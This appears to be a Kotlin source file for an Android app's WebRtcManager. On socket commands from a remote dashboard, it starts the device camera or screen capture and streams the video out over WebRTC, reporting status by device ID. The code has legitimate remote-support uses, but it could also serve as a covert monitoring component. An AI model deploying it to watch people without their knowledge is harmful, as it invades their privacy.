package com.sync.xxx

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.Surface
import android.view.WindowManager
import io.socket.client.Socket
import org.json.JSONObject
import org.webrtc.*
import java.io.ByteArrayOutputStream

class WebRtcManager(
    private val context: Context,
    private val socket: Socket,
    private val deviceId: String
) {

    companion object {
        private const val TAG = "WebRtcManager"
        // ICE servers — pakai STUN Google + TURN publik
        private val ICE_SERVERS = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
        )
    }

    // ── State ──────────────────────────────────────────────────
    private var eglBase: EglBase? = null
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var cameraPc: PeerConnection? = null
    private var screenPc: PeerConnection? = null

    // Camera
    private var cameraVideoCapturer: CameraVideoCapturer? = null
    private var cameraVideoSource: VideoSource? = null
    private var cameraVideoTrack: VideoTrack? = null
    private var cameraActive = false

    // Screen
    private var screenCapturer: ScreenCapturerAndroid? = null
    private var screenVideoSource: VideoSource? = null
    private var screenVideoTrack: VideoTrack? = null
    private var screenActive = false
    private var savedProjectionResultCode = -1
    private var savedProjectionData: Intent? = null

    private val mainHandler = Handler(Looper.getMainLooper())

    // ── Init ───────────────────────────────────────────────────
    fun initialize() {
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(context)
                .setEnableInternalTracer(false)
                .createInitializationOptions()
        )
        eglBase = EglBase.create()
        val options = PeerConnectionFactory.Options()
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setOptions(options)
            .setVideoEncoderFactory(
                DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true)
            )
            .setVideoDecoderFactory(
                DefaultVideoDecoderFactory(eglBase!!.eglBaseContext)
            )
            .createPeerConnectionFactory()

        setupSocketListeners()
        Log.d(TAG, "WebRtcManager initialized")
    }

    // ── Socket Signal Listeners ────────────────────────────────
    private fun setupSocketListeners() {
        // Dashboard → device: kirim SDP answer setelah device emit offer
        socket.on("webrtc:answer:camera") { args ->
            val data = args[0] as? JSONObject ?: return@on
            val sdp  = data.optString("sdp")
            cameraPc?.setRemoteDescription(
                SimpleSdpObserver(), SessionDescription(SessionDescription.Type.ANSWER, sdp)
            )
        }
        socket.on("webrtc:answer:screen") { args ->
            val data = args[0] as? JSONObject ?: return@on
            val sdp  = data.optString("sdp")
            screenPc?.setRemoteDescription(
                SimpleSdpObserver(), SessionDescription(SessionDescription.Type.ANSWER, sdp)
            )
        }
        socket.on("webrtc:ice:camera") { args ->
            val data      = args[0] as? JSONObject ?: return@on
            val candidate = data.optString("candidate")
            val sdpMid    = data.optString("sdpMid")
            val sdpIndex  = data.optInt("sdpMLineIndex")
            cameraPc?.addIceCandidate(IceCandidate(sdpMid, sdpIndex, candidate))
        }
        socket.on("webrtc:ice:screen") { args ->
            val data      = args[0] as? JSONObject ?: return@on
            val candidate = data.optString("candidate")
            val sdpMid    = data.optString("sdpMid")
            val sdpIndex  = data.optInt("sdpMLineIndex")
            screenPc?.addIceCandidate(IceCandidate(sdpMid, sdpIndex, candidate))
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  CAMERA WebRTC
    // ═══════════════════════════════════════════════════════════

    fun startCamera(facing: String) {
        if (cameraActive) stopCamera()
        mainHandler.post {
            try {
                val factory = peerConnectionFactory ?: return@post
                val egl     = eglBase ?: return@post

                // Video source
                cameraVideoSource = factory.createVideoSource(false)

                // Capturer
                val enumerator = Camera2Enumerator(context)
                val cameraId   = if (facing == "front") {
                    enumerator.deviceNames.firstOrNull { enumerator.isFrontFacing(it) }
                } else {
                    enumerator.deviceNames.firstOrNull { enumerator.isBackFacing(it) }
                } ?: enumerator.deviceNames.firstOrNull()

                if (cameraId == null) {
                    Log.e(TAG, "No camera found")
                    return@post
                }

                val capturer = enumerator.createCapturer(cameraId, null) as? CameraVideoCapturer
                    ?: return@post
                cameraVideoCapturer = capturer

                val surfaceHelper = SurfaceTextureHelper.create("CameraThread", egl.eglBaseContext)
                capturer.initialize(surfaceHelper, context, cameraVideoSource!!.capturerObserver)
                capturer.startCapture(1280, 720, 30)

                cameraVideoTrack = factory.createVideoTrack("video_camera", cameraVideoSource)
                cameraVideoTrack?.setEnabled(true)

                // PeerConnection
                cameraPc = createPeerConnection("camera")
                cameraVideoTrack?.let { track ->
                    cameraPc?.addTrack(track, listOf("stream_camera"))
                }

                // Create offer → kirim ke server
                cameraPc?.createOffer(object : SimpleSdpObserver() {
                    override fun onCreateSuccess(sdp: SessionDescription) {
                        cameraPc?.setLocalDescription(SimpleSdpObserver(), sdp)
                        socket.emit("webrtc:offer:camera", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("sdp", sdp.description)
                            put("type", sdp.type.canonicalForm())
                        })
                    }
                }, MediaConstraints().apply {
                    mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"))
                    mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"))
                })

                cameraActive = true
                emitStatus(JSONObject().apply { put("cameraActive", true) })
                Log.d(TAG, "Camera started: $facing")
            } catch (e: Exception) {
                Log.e(TAG, "startCamera error: ${e.message}")
            }
        }
    }

    fun stopCamera() {
        mainHandler.post {
            try {
                cameraVideoCapturer?.stopCapture()
                cameraVideoCapturer?.dispose()
                cameraVideoCapturer = null
                cameraVideoTrack?.dispose()
                cameraVideoTrack = null
                cameraVideoSource?.dispose()
                cameraVideoSource = null
                cameraPc?.close()
                cameraPc = null
                cameraActive = false
                emitStatus(JSONObject().apply { put("cameraActive", false) })
                Log.d(TAG, "Camera stopped")
            } catch (e: Exception) {
                Log.e(TAG, "stopCamera error: ${e.message}")
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  SCREEN WebRTC
    // ═══════════════════════════════════════════════════════════

    fun requestScreenCapture() {
        // Kalau sudah ada projection data, langsung start
        if (savedProjectionResultCode == android.app.Activity.RESULT_OK
            && savedProjectionData != null
        ) {
            startScreenCapture(savedProjectionResultCode, savedProjectionData!!)
            return
        }
        // Minta permission via activity
        val intent = Intent(context, ScreenCaptureActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    fun onScreenCaptureResult(resultCode: Int, data: Intent) {
        savedProjectionResultCode = resultCode
        savedProjectionData = data
        if (resultCode == android.app.Activity.RESULT_OK) {
            startScreenCapture(resultCode, data)
        } else {
            emitStatus(JSONObject().apply { put("screenActive", false) })
        }
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        if (screenActive) stopScreenCapture()
        mainHandler.post {
            try {
                val factory = peerConnectionFactory ?: return@post
                val egl     = eglBase ?: return@post

                screenVideoSource = factory.createVideoSource(true /* isScreencast */)

                val capturer = ScreenCapturerAndroid(data, object : MediaProjection.Callback() {
                    override fun onStop() {
                        Log.w(TAG, "Screen projection stopped by system")
                        stopScreenCapture()
                    }
                })
                screenCapturer = capturer

                val surfaceHelper = SurfaceTextureHelper.create("ScreenThread", egl.eglBaseContext)
                capturer.initialize(surfaceHelper, context, screenVideoSource!!.capturerObserver)
                capturer.startCapture(1280, 720, 30)

                screenVideoTrack = factory.createVideoTrack("video_screen", screenVideoSource)
                screenVideoTrack?.setEnabled(true)

                screenPc = createPeerConnection("screen")
                screenVideoTrack?.let { track ->
                    screenPc?.addTrack(track, listOf("stream_screen"))
                }

                screenPc?.createOffer(object : SimpleSdpObserver() {
                    override fun onCreateSuccess(sdp: SessionDescription) {
                        screenPc?.setLocalDescription(SimpleSdpObserver(), sdp)
                        socket.emit("webrtc:offer:screen", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("sdp", sdp.description)
                            put("type", sdp.type.canonicalForm())
                        })
                    }
                }, MediaConstraints().apply {
                    mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"))
                    mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"))
                })

                screenActive = true
                emitStatus(JSONObject().apply { put("screenActive", true) })
                Log.d(TAG, "Screen capture started")
            } catch (e: Exception) {
                Log.e(TAG, "startScreenCapture error: ${e.message}")
                emitStatus(JSONObject().apply { put("screenActive", false) })
            }
        }
    }

    fun stopScreenCapture() {
        mainHandler.post {
            try {
                screenCapturer?.stopCapture()
                screenCapturer?.dispose()
                screenCapturer = null
                screenVideoTrack?.dispose()
                screenVideoTrack = null
                screenVideoSource?.dispose()
                screenVideoSource = null
                screenPc?.close()
                screenPc = null
                screenActive = false
                emitStatus(JSONObject().apply { put("screenActive", false) })
                Log.d(TAG, "Screen stopped")
            } catch (e: Exception) {
                Log.e(TAG, "stopScreenCapture error: ${e.message}")
            }
        }
    }

    // ── PeerConnection Factory Helper ──────────────────────────
    private fun createPeerConnection(label: String): PeerConnection? {
        val config = PeerConnection.RTCConfiguration(ICE_SERVERS).apply {
            sdpSemantics    = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
        }
        return peerConnectionFactory?.createPeerConnection(config, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                socket.emit("webrtc:ice:$label:device", JSONObject().apply {
                    put("deviceId",      deviceId)
                    put("candidate",     candidate.sdp)
                    put("sdpMid",        candidate.sdpMid)
                    put("sdpMLineIndex", candidate.sdpMLineIndex)
                    put("label",         label)
                })
            }
            override fun onConnectionChange(state: PeerConnection.PeerConnectionState) {
                Log.d(TAG, "[$label] connection: $state")
            }
            override fun onIceConnectionChange(s: PeerConnection.IceConnectionState) {}
            override fun onIceConnectionReceivingChange(b: Boolean) {}
            override fun onIceGatheringChange(s: PeerConnection.IceGatheringState) {}
            override fun onSignalingChange(s: PeerConnection.SignalingState) {}
            override fun onAddStream(s: MediaStream) {}
            override fun onRemoveStream(s: MediaStream) {}
            override fun onDataChannel(d: DataChannel) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(r: RtpReceiver, s: Array<out MediaStream>) {}
            override fun onIceCandidatesRemoved(c: Array<out IceCandidate>) {}
        })
    }

    // ── Util ───────────────────────────────────────────────────
    private fun emitStatus(obj: JSONObject) {
        if (!socket.connected()) return
        socket.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", obj)
        })
    }

    fun release() {
        stopCamera()
        stopScreenCapture()
        mainHandler.post {
            peerConnectionFactory?.dispose()
            peerConnectionFactory = null
            eglBase?.release()
            eglBase = null
        }
    }
}

// ── SDP Observer kosong ────────────────────────────────────────
open class SimpleSdpObserver : SdpObserver {
    override fun onCreateSuccess(sdp: SessionDescription) {}
    override fun onSetSuccess() {}
    override fun onCreateFailure(s: String) { Log.e("SdpObserver", "create fail: $s") }
    override fun onSetFailure(s: String)    { Log.e("SdpObserver", "set fail: $s") }
}